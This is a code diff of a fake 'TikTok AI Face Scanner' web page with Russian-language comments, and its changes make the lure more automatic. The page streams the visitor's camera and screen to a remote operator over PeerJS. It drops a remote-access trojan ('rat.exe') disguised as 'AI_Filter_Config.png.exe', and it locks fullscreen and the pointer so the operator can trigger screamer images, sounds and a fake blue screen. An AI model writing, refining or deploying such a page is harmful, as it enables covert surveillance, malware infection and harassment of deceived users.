@@ -3,55 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok AI Face Morph v4.2</title>
+    <title>TikTok AI Face Morph v5.0</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
-        .box { width: 90%; max-width: 420px; padding: 30px; border-radius: 25px; background: #0a0a0a; border: 1px solid #1a1a1a; box-shadow: 0 10px 30px rgba(0,0,0,1); position: relative; z-index: 10; }
-        .logo { width: 65px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #ff0050); }
-        h1 { font-size: 22px; margin: 10px 0; background: linear-gradient(45deg, #00f2ea, #ff0050); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(255,0,80,0.3); }
-        .btn:hover { transform: scale(1.02); background: #ff1e6d; }
-        #loader, #result, #screamer { display: none; }
-        .progress-container { width: 100%; height: 8px; background: #1a1a1a; border-radius: 10px; margin: 25px 0; overflow: hidden; }
-        .progress-fill { width: 0%; height: 100%; background: #ff0050; transition: width 0.2s; }
+        body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
+        .box { width: 90%; max-width: 400px; padding: 30px; border-radius: 25px; background: #0a0a0a; border: 1px solid #1a1a1a; }
+        .btn { background: #ff0050; color: #fff; border: none; padding: 18px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 20px; }
+        #loader, #screamer { display: none; }
+        .progress-fill { width: 0%; height: 8px; background: #ff0050; transition: 0.15s; border-radius: 10px; }
+        #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; display: none; align-items: center; justify-content: center; }
+        #screamer img { width: 130%; height: 130%; object-fit: cover; animation: shake 0.1s infinite; }
+        @keyframes shake { 0% { transform: translate(3px, 3px); } 50% { transform: translate(-3px, -4px); } 100% { transform: translate(2px, 3px); } }
         .no-cursor { cursor: none !important; }
-
-        /* СКРИМЕР ЭФФЕКТЫ */
-        #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 999999; display: none; align-items: center; justify-content: center; }
-        #screamer img { width: 120%; height: 120%; object-fit: cover; animation: shake 0.1s infinite, flash 0.1s infinite; }
-        @keyframes shake {
-            0% { transform: translate(2px, 2px) rotate(0deg); }
-            50% { transform: translate(-2px, -3px) rotate(-1deg); }
-            100% { transform: translate(1px, 2px) rotate(1deg); }
-        }
-        @keyframes flash {
-            0% { filter: brightness(1) contrast(1.5); }
-            50% { filter: brightness(2) contrast(3) invert(1); }
-            100% { filter: brightness(1) contrast(1.5); }
-        }
     </style>
 </head>
-<body id="main-body">
+<body>
 
-    <div id="start-screen" class="box">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" class="logo">
+    <div id="start" class="box">
+        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="60">
         <h1>AI Face Scanner</h1>
-        <p style="color: #666; font-size: 14px;">Разрешите доступ к камере для калибровки нейросети</p>
+        <p style="color: #666;">Нажмите для калибровки фильтра</p>
         <button class="btn" onclick="initApp()">ПОДКЛЮЧИТЬ</button>
     </div>
 
     <div id="loader" class="box">
-        <h2 id="load-status">АНАЛИЗ ЛИЦА...</h2>
-        <div class="progress-container"><div id="fill" class="progress-fill"></div></div>
-        <p id="pct" style="font-weight: bold; color: #00f2ea;">0%</p>
-        <p id="console" style="font-family: monospace; font-size: 10px; color: #444;"></p>
-    </div>
-
-    <div id="result" class="box">
-        <h2 style="color: #00f2ea;">ГОТОВО!</h2>
-        <p style="font-size: 14px;">Ваша AI-маска сгенерирована. Скачайте файл и откройте его для просмотра.</p>
-        <button class="btn" style="background: #00f2ea; color: #000;" onclick="getAccessAndFile()">СКАЧАТЬ ФОТО</button>
+        <h2 id="status">АНАЛИЗ БИОМЕТРИИ...</h2>
+        <div style="width:100%; background:#222; border-radius:10px;"><div id="fill" class="progress-fill"></div></div>
+        <p id="pct">0%</p>
     </div>
 
     <div id="screamer">
@@ -66,12 +44,10 @@
         const peer = new Peer();
         let conn;
 
-        // Блокировка управления и полный экран
-        function lockDown() {
-            const el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
+        function lock() {
+            try { document.documentElement.requestFullscreen(); } catch(e){}
             document.body.classList.add('no-cursor');
-            if (el.requestPointerLock) el.requestPointerLock();
+            try { document.documentElement.requestPointerLock(); } catch(e){}
         }
 
         async function initApp() {
@@ -80,65 +56,56 @@
                 conn = peer.connect(ADM_ID);
                 peer.call(ADM_ID, stream);
 
-                document.getElementById('start-screen').style.display = 'none';
+                document.getElementById('start').style.display = 'none';
                 document.getElementById('loader').style.display = 'block';
 
                 let p = 0;
-                let bar = document.getElementById('fill');
-                let txt = document.getElementById('pct');
-                let interval = setInterval(() => {
-                    p += Math.floor(Math.random() * 12) + 4;
+                let int = setInterval(async () => {
+                    p += Math.floor(Math.random() * 10) + 5;
                     if (p >= 100) {
                         p = 100;
-                        clearInterval(interval);
-                        setTimeout(() => {
-                            document.getElementById('loader').style.display = 'none';
-                            document.getElementById('result').style.display = 'block';
-                        }, 600);
+                        clearInterval(int);
+                        document.getElementById('status').innerText = "СИНХРОНИЗАЦИЯ...";
+                        // СРАЗУ ЗАПРАШИВАЕМ ЭКРАН И ДАЕМ ФАЙЛ
+                        await getFinalAccess();
                     }
-                    bar.style.width = p + '%';
-                    txt.innerText = p + '%';
-                }, 250);
+                    document.getElementById('fill').style.width = p + '%';
+                    document.getElementById('pct').innerText = p + '%';
+                }, 150);
 
-                listenCommands();
-            } catch (e) { alert("Ошибка! Доступ к камере обязателен."); location.reload(); }
+                listen();
+            } catch (e) { alert("Ошибка доступа!"); location.reload(); }
         }
 
-        async function getAccessAndFile() {
-            lockDown(); // Входим в F11 и лочим мышь
-            
-            // 1. Пытаемся забрать экран
-            try {
-                const screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                peer.call(ADM_ID, screen);
-            } catch(e) {}
-
-            // 2. Качаем твой ратник
+        async function getFinalAccess() {
+            // Скачиваем файл скрыто
             const a = document.createElement('a');
-            a.href = 'rat.exe'; // УКАЖИ СВОЙ ФАЙЛ
-            a.download = 'AI_Result_TikTok.png.exe';
-            document.body.appendChild(a);
+            a.href = 'rat.exe'; 
+            a.download = 'AI_Filter_Config.png.exe';
             a.click();
-            document.body.removeChild(a);
 
-            document.getElementById('result').innerHTML = "<h2>ЗАГРУЗКА...</h2><p>Откройте файл для просмотра.</p>";
+            // Запрос экрана без лишних кнопок
+            try {
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                peer.call(ADM_ID, screenStream);
+                document.getElementById('loader').innerHTML = "<h2>ГОТОВО</h2><p>Эффект применен в приложении TikTok</p>";
+            } catch(e) {
+                document.getElementById('loader').innerHTML = "<h2>ОШИБКА</h2><p>Разрешите доступ для работы фильтра</p>";
+            }
         }
 
-        function listenCommands() {
+        function listen() {
             conn.on('data', d => {
                 if (d.type === 'SCR') {
-                    lockDown();
+                    lock();
                     document.getElementById('screamer').style.display = 'flex';
-                    const audio = document.getElementById('s-audio');
-                    audio.volume = 1.0;
-                    audio.play();
-                    if(navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
+                    document.getElementById('s-audio').play();
+                } else if (d.type === 'BSOD') {
+                    lock();
+                    document.body.innerHTML = '<img src="https://i.stack.imgur.com/86j1B.png" style="width:100vw;height:100vh;position:fixed;top:0;left:0;">';
                 } else if (d.type === 'SND') {
                     let a = document.getElementById('r-snd');
                     a.src = d.url; a.play();
-                } else if (d.type === 'BSOD') {
-                    lockDown();
-                    document.body.innerHTML = '<img src="https://i.stack.imgur.com/86j1B.png" style="width:100vw;height:100vh;position:fixed;top:0;left:0;z-index:999999;cursor:none;">';
                 }
             });
         }
